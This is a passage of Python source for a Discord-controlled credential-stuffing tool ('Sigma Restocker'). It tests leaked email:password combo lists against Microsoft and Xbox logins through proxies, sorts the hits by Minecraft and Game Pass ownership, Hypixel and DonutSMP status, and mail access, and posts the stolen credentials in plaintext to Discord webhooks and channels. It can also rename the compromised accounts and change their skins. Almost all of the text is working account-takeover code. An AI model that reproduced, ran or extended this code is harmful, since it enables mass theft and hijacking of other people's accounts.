        if self.donutsmp_blocks_broken: msg += f"\nDonutSMP Blocks Broken: {self.donutsmp_blocks_broken}"
        if self.donutsmp_blocks_placed: msg += f"\nDonutSMP Blocks Placed: {self.donutsmp_blocks_placed}"
        if self.donutsmp_shards: msg += f"\nDonutSMP Shards: {self.donutsmp_shards}"
        if self.donutsmp_location: msg += f"\nDonutSMP Location: {self.donutsmp_location}"
        if self.donutsmp_mobs_killed: msg += f"\nDonutSMP Mobs Killed: {self.donutsmp_mobs_killed}"
        if self.donutsmp_money_spent: msg += f"\nDonutSMP Money Spent: ${self.donutsmp_money_spent}"
        if self.donutsmp_money_made: msg += f"\nDonutSMP Money Made: ${self.donutsmp_money_made}"
        return msg

    # FIXED notify() method: uses correct webhook for hits and supports second webhook
    def notify(self):
        try:
            # Determine primary webhook URL based on ban status
            if self.banned == "False":
                hypixel_status = f"{UNBAN_EMOJI} Unbanned"
                embed_color = 0xf1c40f
                primary_webhook = bot_config["Webhooks"].get("unbanned_webhook") or bot_config["Webhooks"].get("hits_webhook") or DEFAULT_WEBHOOK_URL
            elif self.banned and self.banned != "False":
                hypixel_status = "❌ Banned"
                embed_color = 0xe67e22
                primary_webhook = bot_config["Webhooks"].get("banned_webhook") or bot_config["Webhooks"].get("hits_webhook") or DEFAULT_WEBHOOK_URL
            else:
                # No ban info yet – treat as regular hit
                hypixel_status = "Unknown"
                embed_color = 0xE63946
                primary_webhook = bot_config["Webhooks"].get("hits_webhook") or DEFAULT_WEBHOOK_URL

            fields = [
                {"name": "📧 Email", "value": f"||{self.email}||", "inline": True},
                {"name": "🔑 Password", "value": f"||{self.password}||", "inline": True},
                {"name": "🏷️ Hypixel Name", "value": self.hypixl or "N/A", "inline": False},
                {"name": "🔄 Can Change Name", "value": self.namechanged or "N/A", "inline": True},
                {"name": "📊 Hypixel Level", "value": self.level or "N/A", "inline": True},
                {"name": "🚫 Hypixel Status", "value": hypixel_status, "inline": True},
                {"name": "🧥 Capes", "value": f"{self.capes or 'N/A'} | Optifine: {self.cape or 'N/A'}", "inline": True},
                {"name": "📁 Account Type", "value": self.type or "N/A", "inline": True}
            ]
            if self.karma:
                fields.append({"name": "🌟 Hypixel Karma", "value": self.karma, "inline": True})
            
            if self.donutsmp:
                fields.append({"name": "🍩 DonutSMP Status", "value": self.donutsmp, "inline": True})
                if self.donutsmp_banned == "False":
                    donut_ban = f"{UNBAN_EMOJI} Unbanned"
                elif self.donutsmp_banned == "True":
                    donut_ban = "❌ Banned"
                else:
                    donut_ban = self.donutsmp_banned or "Unknown"
                fields.append({"name": "🍩 DonutSMP Banned", "value": donut_ban, "inline": True})
                fields.append({"name": "🍩 DonutSMP Rank", "value": self.donutsmp_rank or "N/A", "inline": True})
                fields.append({"name": "💰 DonutSMP Balance", "value": f"${self.donutsmp_balance or 'N/A'}", "inline": True})
                fields.append({"name": "🔮 DonutSMP Shards", "value": self.donutsmp_shards or "N/A", "inline": True})
                fields.append({"name": "⚔️ DonutSMP Kills", "value": self.donutsmp_kills or "N/A", "inline": True})
                fields.append({"name": "💀 DonutSMP Deaths", "value": self.donutsmp_deaths or "N/A", "inline": True})
                fields.append({"name": "⏱️ DonutSMP Playtime", "value": self.donutsmp_playtime or "N/A", "inline": True})
            
            namechange_ping = ""
            if str(self.namechanged).lower() == "true":
                namechange_ping = "@here "
            fields.append({"name": "🔗 Combo", "value": f"{namechange_ping}||```{self.email}:{self.password}```||", "inline": False})
            
            embed = {
                "title": self.name or "N/A",
                "color": embed_color,
                "thumbnail": {"url": f"https://mc-heads.net/body/{self.name}" if self.name and self.name != "N/A" else "https://mc-heads.net/body/steve"},
                "fields": fields,
                "footer": {"text": "Auto restocker by Demon King", "icon_url": BOT_AVATAR_URL},
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            payload = {
                "username": "Restock by Demon King",
                "avatar_url": BOT_AVATAR_URL,
                "embeds": [embed]
            }
            # Send to primary webhook
            requests.post(primary_webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"}, timeout=10)
            # Send to secondary webhook if configured
            second_webhook = bot_config["Webhooks"].get("second_hits_webhook", "")
            if second_webhook and second_webhook.strip():
                requests.post(second_webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"}, timeout=10)
        except Exception as e:
            print(f"Webhook error: {e}")

    def optifine(self):
        if demonking_cfg.get('optifinecape'):
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy(), verify=False, timeout=15).text
                self.cape = "No" if "Not found" in txt else "Yes"
            except: self.cape = "Unknown"

    def full_access(self):
        global mfa, sfa
        if demonking_cfg.get('access'):
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False, timeout=15).text)
                if out["Success"] == 1:
                    self.access = "True"
                    mfa += 1
                    open(f"results/{current_fname}/MFA.txt", 'a').write(f"{self.email}:{self.password}\n")
                else:
                    self.access = "False"
                    sfa += 1
                    open(f"results/{current_fname}/SFA.txt", 'a').write(f"{self.email}:{self.password}\n")
            except: self.access = "Unknown"

    def namechange(self):
        global retries
        if demonking_cfg.get('namechange') or demonking_cfg.get('lastchanged'):
            tries = 0
            while tries < maxretries_checker:
                try:
                    check = self.session.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, timeout=20)
                    if check.status_code == 200:
                        data = check.json()
                        if demonking_cfg.get('namechange'):
                            self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                        if demonking_cfg.get('lastchanged') and data.get('createdAt'):
                            ca = data['createdAt']
                            try:
                                gd = datetime.strptime(ca, "%Y-%m-%dT%H:%M:%S.%fZ")
                            except:
                                gd = datetime.strptime(ca, "%Y-%m-%dT%H:%M:%SZ")
                            gd = gd.replace(tzinfo=timezone.utc)
                            cd = datetime.now(timezone.utc)
                            diff = cd - gd
                            y = diff.days//365
                            m = (diff.days%365)//30
                            d = diff.days
                            if y>0: self.lastchanged = f"{y} year{'s' if y>1 else ''} - {gd.strftime('%m/%d/%Y')} - {ca}"
                            elif m>0: self.lastchanged = f"{m} month{'s' if m>1 else ''} - {gd.strftime('%m/%d/%Y')} - {ca}"
                            else: self.lastchanged = f"{d} day{'s' if d>1 else ''} - {gd.strftime('%m/%d/%Y')} - {ca}"
                            break
                    if check.status_code == 429 and len(proxylist) < 5:
                        time.sleep(3)
                except:
                    pass
                tries+=1
                retries+=1
                time.sleep(1)

    def save_cookies(self, typ):
        cf = os.path.join(f'results/{current_fname}', 'Cookies')
        os.makedirs(cf, exist_ok=True)
        bf = os.path.join(cf, typ)
        os.makedirs(bf, exist_ok=True)
        cp = os.path.join(bf, f'{self.name}.txt')
        jar = MozillaCookieJar(cp)
        for c in self.session.cookies:
            jar.set_cookie(c)
        jar.save(ignore_discard=True)
        with open(cp,'r') as f:
            lines = f.readlines()
        lines = lines[3:]
        while lines and lines[0].strip()=='':
            lines.pop(0)
        with open(cp,'w') as f:
            f.writelines(lines)

    def setname(self):
        newname = ''.join(random.choices(string.ascii_lowercase + string.digits, k=3)) + "_" + demonking_cfg.get('name') + "_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=3))
        tries=0
        while tries<maxretries_checker:
            try:
                changereq = self.session.put("https://api.minecraftservices.com/minecraft/profile/name/"+newname, headers={'Authorization': f'Bearer {self.token}'}, timeout=20)
                if changereq.status_code == 200:
                    self.type+=" [SET MC]"
                    self.name = self.name+f" -> {newname}"
                    break
                elif changereq.status_code == 429:
                    time.sleep(3)
            except: pass
            tries+=1

    def setskin(self):
        tries=0
        while tries<maxretries_checker:
            try:
                data = {"url": demonking_cfg.get('skin'), "variant": demonking_cfg.get('variant')}
                r = self.session.post("https://api.minecraftservices.com/minecraft/profile/skins", json=data, headers={'Authorization': f'Bearer {self.token}', 'Content-Type': 'application/json'}, timeout=20)
                if r.status_code==200:
                    self.type+=" [SET SKIN]"
                    break
                elif r.status_code==429:
                    time.sleep(3)
            except: pass
            tries+=1

    def handle(self, session):
        global hits
        if self.name != 'N/A':
            try: self.hypixel_api()
            except: pass
            try: self.optifine()
            except: pass
            try: self.full_access()
            except: pass
            try: self.namechange()
            except: pass
            try: self.hypixel_ban_check()
            except: pass
            try: self.donutsmp_stats()
            except: pass
            try: self.check_donut_ban()
            except: pass
            if demonking_cfg.get('setname'): self.setname()
            if demonking_cfg.get('setskin'): self.setskin()
        else:
            if demonking_cfg.get('setskin'): self.setskin()
        full = self.builder()
        hits += 1
        with open(f"results/{current_fname}/Hits.txt", 'a') as f:
            f.write(f"{self.email}:{self.password}\n")
        open(f"results/{current_fname}/Capture.txt", 'a').write(full + "\n============================\n")
        self.notify()  # <-- webhook is sent here

def checkmc(session, email, password, token, xbox_token):
    global retries, cpm, checked, xgp, xgpu, other
    for _ in range(maxretries_checker):
        try:
            checkrq = session.get('https://api.minecraftservices.com/entitlements/license', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=30)
            if checkrq.status_code == 429:
                retries += 1
                session.proxies = getproxy()
                time.sleep(20)
                continue
            else:
                break
        except:
            retries += 1
            session.proxies = getproxy()
            time.sleep(2)
            continue
    else:
        return False
    if checkrq.status_code == 200:
        acctype = checkownership(checkrq.json())
        if acctype in ("Xbox Game Pass Ultimate", "Normal Minecraft (with Game Pass Ultimate)"):
            xgpu += 1
            cpm += 1
            checked += 1
            with open(f"results/{current_fname}/XboxGamePassUltimate.txt", 'a') as f:
                f.write(f"{email}:{password}\n")
            if "Normal" in acctype:
                with open(f"results/{current_fname}/Normal.txt", 'a') as f:
                    f.write(f"{email}:{password}\n")
            capture_mc(token, session, email, password, acctype)
            return True
        elif acctype in ("Xbox Game Pass (PC)", "Normal Minecraft (with Game Pass)"):
            xgp += 1
            cpm += 1
            checked += 1
            with open(f"results/{current_fname}/XboxGamePass.txt", 'a') as f:
                f.write(f"{email}:{password}\n")
            if "Normal" in acctype:
                with open(f"results/{current_fname}/Normal.txt", 'a') as f:
                    f.write(f"{email}:{password}\n")
            capture_mc(token, session, email, password, acctype)
            return True
        elif acctype == "Normal Minecraft":
            checked += 1
            cpm += 1
            with open(f"results/{current_fname}/Normal.txt", 'a') as f:
                f.write(f"{email}:{password}\n")
            capture_mc(token, session, email, password, acctype)
            return True
        else:
            others_list = []
            if 'product_minecraft_bedrock' in checkrq.text:
                others_list.append("Minecraft Bedrock")
            if 'product_legends' in checkrq.text:
                others_list.append("Minecraft Legends")
            if 'product_dungeons' in checkrq.text:
                others_list.append('Minecraft Dungeons')
            if others_list:
                other += 1
                cpm += 1
                checked += 1
                items = ', '.join(others_list)
                with open(f"results/{current_fname}/Other.txt", 'a') as f:
                    f.write(f"{email}:{password} | {items}\n")
                return True
            else:
                return False
    else:
        return False

def capture_mc(access_token, session, email, password, typ):
    global retries
    for _ in range(maxretries_checker):
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, timeout=30)
            if r.status_code == 200:
                data = r.json()
                capes = ", ".join([cape["alias"] for cape in data.get("capes", [])])
                capture = Capture(email, password, data['name'], capes, data['id'], access_token, typ, session)
                capture.handle(session)
                return
            elif r.status_code == 429:
                retries += 1
                session.proxies = getproxy()
                time.sleep(20)
                continue
            else:
                return
        except:
            retries += 1
            session.proxies = getproxy()
            time.sleep(2)
            continue

def validmail(email, password):
    global vm, cpm, checked
    vm += 1
    cpm += 1
    checked += 1
    with open(f"results/{current_fname}/Valid_Mail.txt", 'a') as f:
        f.write(f"{email}:{password}\n")

def payment(session, email, password):
    pass

def authenticate(email, password, tries=0):
    global retries, bad, checked, cpm
    try:
        session = requests.Session()
        session.verify = False
        session.proxies = getproxy()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token != "None" and token != "bad" and token != "2fa":
            hit = False
            try:
                xbox = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, timeout=30)
                js = xbox.json()
                xbox_token = js.get('Token')
                if xbox_token:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, timeout=30)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token:
                        access = mc_token(session, uhs, xsts_token)
                        if access:
                            hit = checkmc(session, email, password, access, xbox_token)
            except Exception as e:
                if tries < maxretries_checker:
                    time.sleep(2 ** tries)
                    authenticate(email, password, tries + 1)
                    return
            if not hit:
                validmail(email, password)
            if demonking_cfg.get('payment'):
                payment(session, email, password)
        else:
            if token == "2fa":
                pass
            elif token == "bad":
                pass
            else:
                bad += 1
                checked += 1
                cpm += 1
    except Exception as e:
        if tries < maxretries_checker:
            time.sleep(2 ** tries)
            authenticate(email, password, tries + 1)
        else:
            bad += 1
            checked += 1
            cpm += 1
    finally:
        session.close()

class CheckerSession:
    def __init__(self, user_id, combos, threads=50):
        self.user_id = user_id
        self.combos = combos
        self.threads = threads
        self.total = len(combos)
        self.running = True
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.current_email = ""
        self.results_dir = self.get_results_dir()
        global current_fname, results_dir, hits, bad, twofa, errors, retries, checked, vm, sfa, mfa, xgp, xgpu, other, cpm, cpm1
        hits = bad = twofa = errors = retries = checked = vm = sfa = mfa = xgp = xgpu = other = cpm = cpm1 = 0
        current_fname = self.results_dir.name
        results_dir = self.results_dir
        os.makedirs(f"results/{current_fname}", exist_ok=True)

    def get_results_dir(self):
        os.makedirs("results", exist_ok=True)
        existing = [d for d in os.listdir("results") if d.isdigit()]
        num = int(max(existing)) + 1 if existing else 1
        path = Path(f"results/{num}")
        path.mkdir(parents=True, exist_ok=True)
        return path

    def check_one(self, combo):
        if not self.running:
            return
        parts = combo.strip().split(":", 1)
        if len(parts) != 2:
            return
        email, password = parts[0].strip(), parts[1].strip()
        with self.lock:
            self.current_email = email
        authenticate(email, password)
        delay = float(bot_config["General"].get("delay", "1.0"))
        time.sleep(delay)

    def run(self):
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.check_one, combo) for combo in self.combos]
            for f in concurrent.futures.as_completed(futures):
                if not self.running:
                    executor.shutdown(wait=False)
                    break
        # Check finished naturally
        self.running = False
        # Schedule cleanup and result sending
        asyncio.run_coroutine_threadsafe(self.finish_and_cleanup(), bot.loop)

    async def finish_and_cleanup(self):
        """Send results and set global active_session to None"""
        await self.send_result_files()
        global active_session
        active_session = None

    async def send_result_files(self):
        # Send all result files except Hits.txt to the main log channel
        log_channel = get_log_channel()
        if log_channel:
            folder = Path(f"results/{current_fname}")
            if folder.exists():
                embed = discord.Embed(title=f"{get_emoji('complete')} Checker Results", color=0xE63946)
                embed.add_field(name="✅ Game Hits", value=hits, inline=True)
                embed.add_field(name="📧 Valid Mails", value=vm, inline=True)
                embed.add_field(name="❌ Bad", value=bad, inline=True)
                embed.add_field(name="🔐 2FA", value=twofa, inline=True)
                embed.add_field(name="⚠️ Errors", value=errors, inline=True)
                embed.set_footer(text=f"Restocker by ALPHA {get_emoji('status')}")
                await log_channel.send(embed=embed)
                for file_path in folder.glob("*.txt"):
                    if file_path.name != "Hits.txt" and file_path.stat().st_size > 0:
                        try:
                            await log_channel.send(file=discord.File(file_path))
                        except:
                            pass
        # Send Hits.txt to the dedicated hits log channel if set
        hits_channel = get_hits_log_channel()
        if hits_channel:
            hits_file = Path(f"results/{current_fname}/Hits.txt")
            if hits_file.exists() and hits_file.stat().st_size > 0:
                try:
                    await hits_channel.send(file=discord.File(hits_file))
                except:
                    pass
        else:
            # Fallback: if no hits channel, send Hits.txt to main log channel
            if log_channel:
                hits_file = Path(f"results/{current_fname}/Hits.txt")
                if hits_file.exists() and hits_file.stat().st_size > 0:
                    try:
                        await log_channel.send(file=discord.File(hits_file))
                    except:
                        pass

# ==================================================================
# DISCORD COMMANDS
# ==================================================================

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="$help | Modern UI"))
    for guild in bot.guilds:
        for emoji in guild.emojis:
            if emoji.name in custom_emojis:
                custom_emojis[emoji.name] = str(emoji)
    # Startup info
    log_chan = get_log_channel()
    hits_chan = get_hits_log_channel()
    print(f"Main log channel: {log_chan.name if log_chan else 'Not set'}")
    print(f"Hits log channel: {hits_chan.name if hits_chan else 'Not set'}")
    print(f"Hits webhook: {bot_config['Webhooks'].get('hits_webhook', 'Not set')[:50]}...")

@bot.command(name="emojis")
async def emojis_cmd(ctx):
    if not is_owner(ctx):
        await send_modern_embed(ctx, "⛔ Access Denied", "Only the bot owner can use this command.", color=0xE63946)
        return
    if not ctx.guild:
        await send_modern_embed(ctx, "❌ Error", "This command must be used in a server.", color=0xE63946)
        return
    if not ctx.guild.me.guild_permissions.manage_emojis:
        await send_modern_embed(ctx, "⚠️ Permission Missing", "I need `Manage Emojis` permission.", color=0xE63946)
        return
    msg = await ctx.send(embed=discord.Embed(title="🔄 Uploading Emojis...", color=0xE63946))
    await upload_emojis_to_guild(ctx.guild)
    await send_modern_embed(ctx, "✅ Emojis Uploaded", "Custom emojis are now ready to use.", color=0xE63946)

@bot.command(name="check")
async def check_cmd(ctx):
    global active_session
    authorized = load_authorized()
    if not is_owner(ctx) and ctx.author.id not in authorized:
        await send_modern_embed(ctx, "⛔ Unauthorised", "You are not allowed to start checks.", color=0xE63946)
        return
    # Allow new check if there's no active session OR the existing one is not running
    if active_session and active_session.running:
        await send_modern_embed(ctx, "⚠️ Check Already Running", "Use `$stop` first.", color=0xE63946)
        return
    if not ctx.message.attachments:
        await send_modern_embed(ctx, "❌ Missing File", "Attach a `.txt` file with combos (email:password per line).", color=0xE63946)
        return
    attachment = ctx.message.attachments[0]
    if not attachment.filename.endswith(".txt"):
        await send_modern_embed(ctx, "❌ Invalid File", "Only `.txt` files are accepted.", color=0xE63946)
        return

    args = ctx.message.content.split()
    proxy_file = None
    proxy_type = "http"
    for arg in args:
        if arg.startswith("proxyfile:"):
            parts = arg.split(":", 2)
            if len(parts) == 3:
                proxy_type = parts[1]
                proxy_file = parts[2]
            else:
                proxy_file = parts[1]
        elif arg == "noproxy":
            bot_proxy_manager.type = "none"
            bot_proxy_manager.proxies = []

    if proxy_file:
        if not os.path.exists(proxy_file):
            await send_modern_embed(ctx, "❌ Proxy File Not Found", f"`{proxy_file}` does not exist.", color=0xE63946)
            return
        count = bot_proxy_manager.load_from_file(proxy_file, proxy_type)
        if count == 0:
            await send_modern_embed(ctx, "⚠️ No Proxies", "No valid proxies found in file.", color=0xE63946)
            return
        await send_modern_embed(ctx, "✅ Proxies Loaded", f"Loaded `{count}` proxies (`{proxy_type.upper()}`).", color=0xE63946)
    else:
        bot_proxy_manager.type = "none"
        bot_proxy_manager.proxies = []

    content = await attachment.read()
    raw_combos = content.decode("utf-8", errors="ignore").splitlines()
    # Deduplicate and filter valid combos
    seen = set()
    combos = []
    for line in raw_combos:
        line = line.strip()
        if ":" in line and line not in seen:
            seen.add(line)
            combos.append(line)
    if not combos:
        await send_modern_embed(ctx, "❌ No Valid Combos", "The file contains no unique email:password lines.", color=0xE63946)
        return

    threads = int(bot_config["General"]["threads"])
    active_session = CheckerSession(ctx.author.id, combos, threads)

    fields = [
        ("📊 Total Combos", str(len(combos)), True),
        ("⚙️ Threads", str(threads), True),
        ("🌐 Proxy Mode", bot_proxy_manager.type.upper() if bot_proxy_manager.type != "none" else "No Proxy", True),
        ("🎯 Scan Type", "Game Hits + Valid Microsoft Accounts", False),
        ("⏱️ Delay", f"{bot_config['General'].get('delay', '1.0')}s between combos", False),
    ]
    await send_modern_embed(ctx, f"{get_emoji('check_start')} Check Started", fields=fields, color=0xE63946)

    def run_checker():
        active_session.run()
    threading.Thread(target=run_checker, daemon=True).start()

@bot.command(name="cui")
async def cui_cmd(ctx):
    global active_session
    if not active_session or not active_session.running:
        await send_modern_embed(ctx, "📊 No Active Check", "Use `$check` to start a new session.", color=0xE63946)
        return
    progress_pct = int(checked / active_session.total * 100) if active_session.total > 0 else 0
    fields = [
        ("📈 Progress", f"`{checked}/{active_session.total}` ({progress_pct}%)", False),
        ("🎮 Hits", f"`{hits}`", True),
        ("📧 Valid Mails", f"`{vm}`", True),
        ("❌ Bad", f"`{bad}`", True),
        ("🔐 2FA", f"`{twofa}`", True),
        ("⚠️ Errors", f"`{errors}`", True),
        ("🔄 Current Email", f"`{active_session.current_email[:40]}`", False),
    ]
    await send_modern_embed(ctx, f"{get_emoji('status')} Current Status", fields=fields, color=0xE63946)

@bot.command(name="stop")
async def stop_cmd(ctx):
    global active_session
    authorized = load_authorized()
    if not is_owner(ctx) and ctx.author.id not in authorized:
        await send_modern_embed(ctx, "⛔ Unauthorised", "You cannot stop checks.", color=0xE63946)
        return
    if not active_session or not active_session.running:
        await send_modern_embed(ctx, "⚠️ No Active Session", "There is no check running.", color=0xE63946)
        return
    active_session.running = False
    await send_modern_embed(ctx, f"{get_emoji('stop')} Stopping Checker", "Results will be saved and sent shortly.", color=0xE63946)
    await asyncio.sleep(3)
    if active_session:
        await active_session.send_result_files()
        active_session = None

@bot.command(name="thread")
async def thread_cmd(ctx, amount: int = None):
    if not is_owner(ctx):
        await send_modern_embed(ctx, "⛔ Owner Only", "Only the bot owner can change thread count.", color=0xE63946)
        return
    if amount is None:
        current = bot_config["General"]["threads"]
        await send_modern_embed(ctx, "⚙️ Current Threads", f"`{current}` threads", color=0xE63946)
        return
    if amount < 1 or amount > 200:
        await send_modern_embed(ctx, "❌ Invalid Value", "Thread count must be between 1 and 200.", color=0xE63946)
        return
    bot_config["General"]["threads"] = str(amount)
    save_bot_config(bot_config)
    await send_modern_embed(ctx, "✅ Threads Updated", f"Set to `{amount}` threads.", color=0xE63946)

@bot.command(name="delay")
async def delay_cmd(ctx, seconds: float = None):
    if not is_owner(ctx):
        await send_modern_embed(ctx, "⛔ Owner Only", "Only the bot owner can change delay.", color=0xE63946)
        return
    if seconds is None:
        current = bot_config["General"].get("delay", "1.0")
        await send_modern_embed(ctx, "⏱️ Current Delay", f"`{current}` seconds between checks", color=0xE63946)
        return
    if seconds < 0:
        seconds = 0
    bot_config["General"]["delay"] = str(seconds)
    save_bot_config(bot_config)
    await send_modern_embed(ctx, "✅ Delay Updated", f"Set to `{seconds}` seconds between combos.", color=0xE63946)

@bot.command(name="set_logchannel")
async def set_logchannel_cmd(ctx, channel: discord.TextChannel = None):
    if not is_owner(ctx):
        await send_modern_embed(ctx, "⛔ Owner Only", "Only the bot owner can set the log channel.", color=0xE63946)
        return
    if channel is None:
        if not ctx.message.channel_mentions:
            await send_modern_embed(ctx, "❌ Missing Channel", "Please mention a channel or provide an ID.\nExample: `$set_logchannel #checker-logs`", color=0xE63946)
            return
        channel = ctx.message.channel_mentions[0]
    bot_config["General"]["log_channel_id"] = str(channel.id)
    save_bot_config(bot_config)
    global LOG_CHANNEL_ID
    LOG_CHANNEL_ID = channel.id
    await send_modern_embed(ctx, "✅ Log Channel Set", f"Result files will be sent to {channel.mention}", color=0xE63946)

@bot.command(name="set_logs_hits")
async def set_logs_hits_cmd(ctx, channel: discord.TextChannel = None):
    if not is_owner(ctx):
        await send_modern_embed(ctx, "⛔ Owner Only", "Only the owner can set the hits log channel.", color=0xE63946)
        return
    if channel is None:
        if not ctx.message.channel_mentions:
            await send_modern_embed(ctx, "❌ Missing Channel", "Please mention a channel.\nExample: `$set_logs_hits #hits-only`", color=0xE63946)
            return
        channel = ctx.message.channel_mentions[0]
    bot_config["General"]["hits_log_channel_id"] = str(channel.id)
    save_bot_config(bot_config)
    await send_modern_embed(ctx, "✅ Hits Log Channel Set", f"Hits.txt will be sent to {channel.mention}", color=0xE63946)

@bot.command(name="set_webhook")
async def set_webhook_cmd(ctx, webhook_type: str = None, webhook_url: str = None):
    if not is_owner(ctx):
        await send_modern_embed(ctx, "⛔ Owner Only", "Only the owner can set webhooks.", color=0xE63946)
        return
    if not webhook_type or not webhook_url:
        await send_modern_embed(ctx, "❌ Missing Arguments", "Usage: `$set_webhook hits|banned|unbanned <webhook_url>`", color=0xE63946)
        return
    valid_types = ["hits", "banned", "unbanned"]
    if webhook_type.lower() not in valid_types:
        await send_modern_embed(ctx, "❌ Invalid Type", f"Type must be one of: {', '.join(valid_types)}", color=0xE63946)
        return
    bot_config["Webhooks"][f"{webhook_type.lower()}_webhook"] = webhook_url
    save_bot_config(bot_config)
    await send_modern_embed(ctx, "✅ Webhook Updated", f"`{webhook_type}` webhook has been set.", color=0xE63946)

@bot.command(name="second_webhook")
async def second_webhook_cmd(ctx, webhook_url: str = None):
    if not is_owner(ctx):
        await send_modern_embed(ctx, "⛔ Owner Only", "Only the owner can set the secondary webhook.", color=0xE63946)
        return
    if not webhook_url:
        await send_modern_embed(ctx, "❌ Missing URL", "Usage: `$second_webhook <webhook_url>`", color=0xE63946)
        return
    bot_config["Webhooks"]["second_hits_webhook"] = webhook_url
    save_bot_config(bot_config)
    await send_modern_embed(ctx, "✅ Secondary Webhook Set", "All hit embeds will also be sent to this webhook.", color=0xE63946)

@bot.command(name="disable_secondwebhook")
async def disable_secondwebhook_cmd(ctx):
    if not is_owner(ctx):
        await send_modern_embed(ctx, "⛔ Owner Only", "Only the owner can disable the secondary webhook.", color=0xE63946)
        return
    bot_config["Webhooks"]["second_hits_webhook"] = ""
    save_bot_config(bot_config)
    await send_modern_embed(ctx, "✅ Secondary Webhook Disabled", "No more duplicates will be sent.", color=0xE63946)

@bot.command(name="auth")
async def auth_cmd(ctx, member: discord.Member):
    if not is_owner(ctx):
        await send_modern_embed(ctx, "⛔ Owner Only", "Only the owner can authorise users.", color=0xE63946)
        return
    auth_list = load_authorized()
    if member.id not in auth_list:
        auth_list.append(member.id)
        save_authorized(auth_list)
        await send_modern_embed(ctx, "✅ User Authorised", f"{member.mention} can now use `$check` and `$stop`.", color=0xE63946)
    else:
        await send_modern_embed(ctx, "⚠️ Already Authorised", f"{member.mention} is already in the list.", color=0xE63946)

@bot.command(name="unauth")
async def unauth_cmd(ctx, member: discord.Member):
    if not is_owner(ctx):
        await send_modern_embed(ctx, "⛔ Owner Only", "Only the owner can unauthorise users.", color=0xE63946)
        return
    auth_list = load_authorized()
    if member.id in auth_list:
        auth_list.remove(member.id)
        save_authorized(auth_list)
        await send_modern_embed(ctx, "✅ User Unauthorised", f"{member.mention} can no longer use commands.", color=0xE63946)
    else:
        await send_modern_embed(ctx, "⚠️ Not Authorised", f"{member.mention} was not in the list.", color=0xE63946)

@bot.command(name="listauth")
async def listauth_cmd(ctx):
    if not is_owner(ctx):
        await send_modern_embed(ctx, "⛔ Owner Only", "Only the owner can view authorised users.", color=0xE63946)
        return
    auth_list = load_authorized()
    if not auth_list:
        await send_modern_embed(ctx, "📋 Authorised Users", "No users are authorised.", color=0xE63946)
        return
    users = []
    for uid in auth_list:
        user = bot.get_user(uid)
        users.append(f"{user.mention} (`{uid}`)" if user else f"Unknown (`{uid}`)")
    await send_modern_embed(ctx, "👑 Authorised Users", "\n".join(users), color=0xE63946)

@bot.command(name="setup")
async def setup_cmd(ctx):
    if not is_owner(ctx):
        await send_modern_embed(ctx, "⛔ Owner Only", "Only the owner can run setup.", color=0xE63946)
        return
    guild = ctx.guild
    log_channel = discord.utils.get(guild.channels, name="checker-logs")
    if not log_channel:
        log_channel = await guild.create_text_channel("checker-logs")
    bot_config["General"]["log_channel_id"] = str(log_channel.id)
    save_bot_config(bot_config)
    global LOG_CHANNEL_ID
    LOG_CHANNEL_ID = log_channel.id

    hits_channel = discord.utils.get(guild.channels, name="hits")
    if not hits_channel:
        hits_channel = await guild.create_text_channel("hits")
    webhook = await hits_channel.create_webhook(name="RestockerHits")
    bot_config["Webhooks"]["hits_webhook"] = webhook.url

    banned_channel = discord.utils.get(guild.channels, name="banned")
    if not banned_channel:
        banned_channel = await guild.create_text_channel("banned")
    webhook2 = await banned_channel.create_webhook(name="RestockerBanned")
    bot_config["Webhooks"]["banned_webhook"] = webhook2.url

    unbanned_channel = discord.utils.get(guild.channels, name="unbanned")
    if not unbanned_channel:
        unbanned_channel = await guild.create_text_channel("unbanned")
    webhook3 = await unbanned_channel.create_webhook(name="RestockerUnbanned")
    bot_config["Webhooks"]["unbanned_webhook"] = webhook3.url

    save_bot_config(bot_config)
    await send_modern_embed(ctx, "✅ Setup Complete", f"Log channel: {log_channel.mention}\nWebhooks created.", color=0xE63946)

@bot.command(name="help")
async def help_cmd(ctx):
    embed = discord.Embed(
        title="⚡ SIGMA RESTOCKER ⚡",
        description="**__Command Reference – Modern UI__**\nUse these commands to control the checker.",
        color=0xE63946
    )
    embed.set_thumbnail(url=BOT_AVATAR_URL if BOT_AVATAR_URL else "https://cdn.discordapp.com/attachments/xxxx/xxxx/9088571b42055095cae0d08efbc6df73.jpg")
    embed.set_footer(text="Restocker by ALPHA • Red Theme", icon_url=BOT_AVATAR_URL if BOT_AVATAR_URL else None)

    commands_list = [
        ("$check", "Attach a `.txt` combo file.\n`proxyfile:http|socks4|socks5:proxies.txt` or `noproxy`"),
        ("$cui", "Show real‑time checking progress (Current Status)."),
        ("$stop", "Stop the active check (owner or authorised user)."),
        ("$thread <number>", "Set concurrent threads (1–200, default 20)."),
        ("$delay <seconds>", "Set delay between combos (default 1.0s). Slower = fewer missed hits."),
        ("$set_logchannel #channel", "Set the main channel where result files (except Hits.txt) are sent."),
